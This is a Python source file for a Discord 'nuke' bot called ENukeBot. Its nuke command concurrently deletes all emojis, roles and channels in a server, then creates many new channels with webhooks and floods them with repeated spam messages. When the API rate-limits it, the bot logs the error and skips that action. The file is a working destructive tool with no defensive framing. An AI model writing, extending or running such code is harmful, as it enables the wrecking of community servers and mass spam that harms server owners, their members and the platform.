import discord
from asyncio import *
from config import __CONFIG__
from discord.ext.commands import *

client = Bot(command_prefix=__CONFIG__["prefix"], intents=discord.Intents.all())

@client.event
async def on_ready():
    print(f"[ENukeBot] Client is up.")

@client.command(name="nuke")
async def nukebot(ctx: Context):
    await ctx.message.delete()
    for emoji in ctx.guild.emojis:
        create_task(killobj(obj=emoji))
    for role in ctx.guild.roles:
        create_task(killobj(obj=role))
    for channel in ctx.guild.channels:
        create_task(killobj(obj=channel))
    for _ in range(__CONFIG__["channel_count"]):
        create_task(createchannel(ctx=ctx))
    for channel in ctx.guild.channels:
        create_task(sendmessage(channel=channel))

async def killobj(obj):
    try:
        await obj.delete()
    except discord.errors.HTTPException as e:
        if e.status == 429:
            print("[ENukeBot] HTTP ratelimit reached. Skipping HTTP delete.")
        else:
            pass

async def createchannel(ctx: Context):
    try:
        chan = await ctx.guild.create_text_channel(name=__CONFIG__["channel"])
        await chan.send(__CONFIG__["message"])
        web = await chan.create_webhook(name=__CONFIG__["webhook"])
        create_task(sendmessage(channel=chan, webhook=web))
    except discord.errors.HTTPException as e:
        if e.status == 429:
            print("[ENukeBot] HTTP ratelimit reached. Skipping HTTP channel creation.")
        else:
            pass

async def sendmessage(channel: discord.TextChannel, webhook: discord.Webhook = None):
    webhook = webhook
    if webhook is not None:
        try:
            for _ in range(__CONFIG__["message_count"]):
                await channel.send(__CONFIG__["message"])
                await webhook.send(__CONFIG__["message"])
        except discord.errors.HTTPException as e:
            if e.status == 429:
                print("[ENukeBot] HTTP ratelimit reached. Skipping HTTP message sending.")
                webhook = None
            else:
                pass
    else:
        try:
            for _ in range(__CONFIG__["message_count"]):
                await channel.send(__CONFIG__["message"])
        except discord.errors.HTTPException as e:
            if e.status == 429:
                print("[ENukeBot] HTTP ratelimit reached. Skipping HTTP message sending.")
            else:
                pass

client.run(__CONFIG__["token"])